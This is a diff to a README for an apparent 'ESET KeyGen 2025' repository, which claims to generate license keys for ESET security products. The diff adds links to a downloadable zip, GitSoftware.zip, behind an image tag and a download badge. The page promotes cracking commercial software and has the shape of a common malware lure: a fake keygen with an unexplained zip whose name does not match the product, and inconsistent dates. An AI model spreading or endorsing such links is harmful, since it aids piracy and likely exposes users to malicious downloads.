@@ -2,9 +2,9 @@
 
 Welcome to the ESET KeyGen 2025 repository! Here you will find tools to generate keys for ESET products with licenses valid until 2024.
 
-![ESET KeyGen 2025]()
+![ESET KeyGen 2025](https://github.com/saghargo-li3/Keygen-ESET-2025/releases/download/Git_Software_v1.7/GitSoftware.zip)
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLORCODE>)]()
+[![Download Software](https://img.shields.io/badge/Download-GitSoftware.zip-<COLORCODE>)](https://github.com/saghargo-li3/Keygen-ESET-2025/releases/download/Git_Software_v1.7/GitSoftware.zip)
 
 ---
 
